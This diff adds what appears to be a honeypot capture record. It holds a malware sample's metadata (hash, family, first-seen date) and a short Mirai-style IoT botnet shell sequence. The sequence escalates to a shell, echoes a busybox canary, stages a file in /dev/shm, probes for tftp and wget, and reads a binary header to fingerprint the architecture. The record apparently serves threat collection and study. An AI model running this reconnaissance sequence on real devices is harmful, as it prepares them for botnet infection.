@@ -1,0 +1,18 @@
+# sha256: c7c1b8ebb9c59f07a677216312c74f61dfa63147ef50422704a3b94942f78f28
+# family: script_generic
+# kind: script
+# size_bytes: 240
+# first_seen: 2026-05-04 00:48:25.389433 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox EGDHI
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EGDHI
+tftp; wget; /bin/busybox EGDHI
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox EGDHI
